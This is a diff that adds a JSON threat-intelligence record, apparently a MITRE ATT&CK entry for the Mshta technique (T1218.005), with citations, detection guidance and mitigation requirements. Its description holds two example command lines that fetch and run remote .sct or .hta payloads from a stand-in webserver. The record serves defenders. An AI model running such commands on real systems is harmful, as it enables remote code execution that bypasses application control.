@@ -1,0 +1,153 @@
+﻿{
+    "id": "T1218.005",
+    "name": "Mshta",
+    "x_mitre_is_subtechnique": true,
+    "revoked": false,
+    "x_mitre_deprecated": false,
+    "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
+    "x_mitre_platforms": [
+        "Windows"
+    ],
+    "x_mitre_domains": [
+        "enterprise-attack"
+    ],
+    "x_mitre_defense_bypassed": [
+        "Application control",
+        "Digital Certificate Validation"
+    ],
+    "external_references": [
+        {
+            "source_name": "mitre-attack",
+            "url": "https://attack.mitre.org/techniques/T1218/005",
+            "external_id": "T1218.005"
+        },
+        {
+            "source_name": "Cylance Dust Storm",
+            "description": "Gross, J. (2016, February 23). Operation Dust Storm. Retrieved December 22, 2021.",
+            "url": "https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf"
+        },
+        {
+            "source_name": "Red Canary HTA Abuse Part Deux",
+            "description": "McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.",
+            "url": "https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/"
+        },
+        {
+            "source_name": "FireEye Attacks Leveraging HTA",
+            "description": "Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.",
+            "url": "https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html"
+        },
+        {
+            "source_name": "Airbus Security Kovter Analysis",
+            "description": "Dove, A. (2016, March 23). Fileless Malware \u2013 A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.",
+            "url": "https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/"
+        },
+        {
+            "source_name": "FireEye FIN7 April 2017",
+            "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.",
+            "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html"
+        },
+        {
+            "source_name": "Wikipedia HTML Application",
+            "description": "Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.",
+            "url": "https://en.wikipedia.org/wiki/HTML_Application"
+        },
+        {
+            "source_name": "MSDN HTML Applications",
+            "description": "Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.",
+            "url": "https://msdn.microsoft.com/library/ms536471.aspx"
+        },
+        {
+            "source_name": "LOLBAS Mshta",
+            "description": "LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019.",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/"
+        }
+    ],
+    "kill_chain_phases": [
+        {
+            "kill_chain_name": "mitre-attack",
+            "phase_name": "defense-evasion"
+        }
+    ],
+    "tactic": [
+        "defense-evasion"
+    ],
+    "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious",
+    "x_mitre_data_sources": [
+        "Network Traffic: Network Connection Creation",
+        "Command: Command Execution",
+        "Process: Process Creation",
+        "File: File Creation"
+    ],
+    "x_mitre_permissions_required": [
+        "User"
+    ],
+    "x_mitre_effective_permissions": [],
+    "x_mitre_system_requirements": [],
+    "x_mitre_remote_support": false,
+    "relation": {
+        "mitigates": [
+            {
+                "name": "Execution Prevention",
+                "description": "Block execution of code on a system through application control, and/or script blocking.",
+                "type": "course-of-action",
+                "id": "M1038"
+            },
+            {
+                "name": "Disable or Remove Feature or Program",
+                "description": "Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.",
+                "type": "course-of-action",
+                "id": "M1042"
+            }
+        ]
+    },
+    "mitigationRequirements": {
+        "requirements": [
+            {
+                "description": "Ensure that Mshta.exe is removed if not necessary within a given environment (its functionality is tied to older versions of Internet Explorer).",
+                "acid": "98581638"
+            },
+            {
+                "description": "Ensure that application whitelisting is configured to block the execution of mshta.exe (if not required for a given system or network).",
+                "acid": "98581639"
+            }
+        ]
+    },
+    "detectionRequirements": {
+        "requirements": [
+            {
+                "description": "Ensure that process monitoring is used to monitor the execution and arguments of mshta.exe.",
+                "acid": "98581631"
+            },
+            {
+                "description": "Ensure that the command-line is monitored to check if mshta.exe executing any raw or obfuscated script (within the command-line).",
+                "acid": "98581632"
+            },
+            {
+                "description": "Ensure that recent invocations of mshta.exe are compared with the history of known good arguments to determine anomalous activity.",
+                "acid": "98581633"
+            },
+            {
+                "description": "Ensure that recent invocations of mshta.exe are compared with the history of executed .hta files to determine anomalous activity.",
+                "acid": "98581634"
+            },
+            {
+                "description": "Ensure that Command arguments used before and after the mshta.exe invocation are inspected to determine the (origin and purpose) execution of .hta file.",
+                "acid": "98581635"
+            },
+            {
+                "description": "Ensure that the use of HTA files is monitored to check suspicious activity.",
+                "acid": "98581636"
+            },
+            {
+                "description": "Ensure that the execution of HTA files is restricted if not necessary within a given environment.",
+                "acid": "98581637"
+            }
+        ]
+    },
+    "cspcontrolIds": [],
+    "externalcontrolIds": [],
+    "peoplecontrolIds": [],
+    "policycontrolIds": [],
+    "technologycontrolIds": [],
+    "cveIds": []
+}
